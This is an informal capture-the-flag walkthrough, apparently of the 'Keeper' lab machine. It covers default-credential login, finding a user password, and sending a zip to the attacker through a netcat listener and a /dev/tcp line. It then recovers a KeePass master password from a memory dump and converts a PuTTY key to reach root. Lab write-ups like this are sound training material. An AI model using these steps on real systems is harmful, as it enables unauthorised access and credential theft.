Initial scans show ports 22, 80
80 redirects to tickets.keeper.htb add that to /etc/hosts
when we visit that, we get redirected to login page.
Default creds, root:passwprd still work, and give us a login
Looking around, we find a user, lnorgaard and password Welcome2023!
ssh, and boom, user.txt

There, we see the RT30000.zip, which was mentioned in the ticket. To transfer the zip
On attacker,
`nc -lvnp 9001 > RT30000.zip`
On victim,
`cat RT30000 > /dev/tcp/10.10.14.31/9001`

once we unzip it, we find a passcodes.kdbx file and a KeePassDumpFull.dmp file
To open the kdbx file, we use
`kpcli passcodes.kdbx` 
but this needs a master password.
Presumably, the password is in the dmp file
It can be done with a dotnet7 version in /opt

But we couldnt get the dotne7, so we run a python implementation
`python keepass-dumper.py -d KeePassDumpFull.dmp`
We get something like ●Mdgr●d med fl●de
When we google the phrase, we see the danish symbols, and denotes a dish
rødgrød med fløde

We try this as password in the kpcli, and lets us login.
In the network folder, there's a puTTy user key file, which uses SSH-RSA alg
So, we now need to convert that putty pass to ssh pass
First save the things is a file, root.ppk (putty priv key)
To do so, we use the `puttygen` tool
`puttygen root.ppk -O private-openssh -o id_rsa`
-O output type, -o output file

seems like we dont have it
`sudo apt cache-search puttygen` `sudo apt-get install putty-tools`

Then ssh to root with
`ssh root@keeper.htb -i id_rsa`
